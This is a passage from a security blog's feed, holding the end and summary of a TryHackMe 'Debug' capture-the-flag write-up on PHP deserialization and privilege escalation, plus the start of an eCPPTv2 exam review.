+&lt;p&gt;That was it, an easy fun box. A great learning opportunity for people who are starting out learning php deserialization attacks.&lt;/p&gt;</content><author><name>Miaulez</name><email>root@miaulez.rocks</email></author><category term="tryhackme" /><category term="infosec" /><category term="php deserialization" /><category term="apache hash" /><category term="ssh banner" /><category term="privesc" /><category term="security" /><category term="pentesting" /><summary type="html">Debug invloves exploiting a php deserialization vulnerability for an initial foothold, escalating to james by cracking an apache password. For root we modify the ssh welcome banner.</summary></entry><entry><title type="html">eCPPTv2 exam review</title><link href="http://localhost:4000/ecppt-review/" rel="alternate" type="text/html" title="eCPPTv2 exam review" /><published>2022-01-06T00:00:00-05:00</published><updated>2022-01-06T00:00:00-05:00</updated><id>http://localhost:4000/ecppt-review</id><content type="html" xml:base="http://localhost:4000/ecppt-review/">&lt;p&gt;&lt;img src=&quot;/assets/images/reviews/ecppt/thumbnail.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;Heyo, I know I might be a bit late on this, since I’ve taken eCPPT on 2021’s December 1st, but I’ll make this review nonetheless.&lt;/p&gt;
 
